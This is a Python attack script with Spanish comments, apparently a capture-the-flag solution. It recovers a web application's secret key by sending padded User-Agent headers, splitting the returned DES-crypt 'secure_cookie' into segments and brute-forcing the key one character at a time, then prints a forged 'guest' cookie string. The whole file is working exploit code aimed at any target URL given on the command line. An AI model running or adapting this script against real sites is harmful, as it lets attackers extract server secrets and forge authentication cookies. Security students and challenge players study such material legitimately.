from passlib.hash import des_crypt
from urllib.parse import unquote 
import argparse
import requests
import string
import sys

"""
Referencia
Uf21ZdnLI9tHMUf3xa.42aiHBAUfJZRSAa4C0QQUfs6waVyTamc6UfgDaONYS.LgEUfcX.nEYCaxDkUf2VmKwrBu5IsUf.cn0BUl3ch6Uf.UzFCOjkxewUf1B1lHlNhM1kUfPFINlAtp2k6UfqspkAb7e0tEUfOB3sbJ5gAr2UfKEB6bUgy4DoUfGPo6RRW1QFEUfwK.a6m.JHAIUfHOiqglHdCDcUfG7A091RYA56Uf0lmYponj4PAUfh3jrN9Sj9V.UfugkIVtkI2RA
"""

# Establecemos la parte estática del User-Agent
# Al poner siempre AA, nos aseguramos que el primer bloque es "guest:AA"
USER_AGENT = "AA"

def cracker(url):
	# Variable en la que almacenaremos los caracteres de la clave secreta
    clave_secreta = ""

    print("Clave Secreta: ", end="", flush=True)
    # Comenzamos con el segmento en el índice 1
    num_segmento = 1
    # Cantidad de As que pondremos en el User-Agent para forzar la posición en la cual queremos que esten los caracteres
    num_As = 6
    while True:
        try:
            if num_segmento > 1: num_As = 7  # Si pasamos el primer segmento debemos de forzar una posición más
            
            # Este bucle representa las posiciones de los bloques
            for i in range(num_As,-2,-1):
                if i == -1:
                    num_segmento += 1
                    break
                encontrado = False
                nueva_peticion = True
                # Suficientes iteraciones para encontrar todos los caracteres
                for _ in range(500):
	                # Si hemos encontrado el caracter saltamos al siguiente
                    if encontrado: break
                    user_agent = "A" * i
                    # nueva peticion es una flag que usaremos para controlar las peticiones al servisor
                    if nueva_peticion:
                        r = requests.get(url, headers={"User-Agent": USER_AGENT + user_agent}, allow_redirects=False, timeout=5)
                    nueva_peticion = False
                    # Obtenemos al cookie
                    secure_cookie = r.cookies.get("secure_cookie")
                    # Sacamos la SAL
                    sal = secure_cookie[0:2]
                    # Tomamos el segmento en cuestion
                    segmento = [secure_cookie[j:j+13] for j in range(0, len(secure_cookie), 13)][num_segmento]
                    
                    # Si el segmento no se ha tomado bien repetiomos la petición
                    if segmento[:2] != sal:
                        nueva_peticion = True
                        continue
                    # Fuerza bruta caracter a caracter
                    for caracter in string.printable:
                    # El primer segmento requiere de usar exclusivamente las As del User-Agent 
                        if num_segmento == 1:
                            segmento_generado = des_crypt.using(salt=sal).hash(user_agent + ":" + clave_secreta + caracter)
                        else:
	                        # Los demas segmentos aprovechan las As y lo que vamos obteniendo de la clave secreta
                            segmento_generado = des_crypt.using(salt=sal).hash(clave_secreta[(int(len(clave_secreta)) - 7):] + caracter)
                        # Si encontramos el caracter lo mostramos por pantalla
                        # La opción por defecto (Activa) es la de mostrar los caracteres nuevos por pantalla
                        # En caso de preferirlo, podemos usar el algoritmo comentado
                        if segmento_generado == segmento:
                            # print("===================")
                            # print(f"segmento original: {segmento}")
                            # print(f"Caracter: {caracter}")
                            # print(f"Segmento generado: {segmento_generado}")
                            # print("===================\n")
                            print(caracter, end="", flush=True)
                            clave_secreta += caracter
                            encontrado = True
                            break
                    if not encontrado:
                        nueva_peticion = True

		# Si llegamos al segmento final retornamos al clave encontrada
        except IndexError:
            return clave_secreta
        
        # Si falla la petición, volvemos a hacerla
        except requests.exceptions.RequestException:
            nueva_peticion = True
            
        # Si detenemos el programa nos muestra la clave obtenida hasta el momento
        except KeyboardInterrupt:
            if clave_secreta:
                print("\n\n=============== Clave Secreta ===============")
                print(clave_secreta)
                print("\n=============== Cookie Completa ===============")
                print("guest:" + USER_AGENT + ":" + clave_secreta)
            else:
                print("[!] Error")
            sys.exit(1)
        
        # Cualquier otro error nos lo muestra y nos saca del programa
        except Exception as e:
            print("[!] " + str(e))
            sys.exit(1)

def main(url):
    # Normalizamos la URL y comprobamos que este bien formada
    url = url if url[-1] != '/' else url[:-1]
    if url.split(':')[0] not in ['http', 'https']:
        print("[!] Falta el esquema de la URL")
        sys.exit(1)
    elif url.split(":")[1][:2] != "//":
        print("[!] Esquema incorrecto")
        sys.exit(1)

	# Llamamos a la función
    clave_secreta = cracker(url)

	# Mostramos el reusltado por pantalla
    if clave_secreta:
        print("\n\n=============== Clave Secreta ===============")
        print(clave_secreta)
    else:
        print("[!] Error")
    

# Tomamos los argumentos
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Obtener clave secreta")

    parser.add_argument("-t", "--target", required=True,
                        help="URL objetivo")
    
    args = parser.parse_args()

    main(args.target)
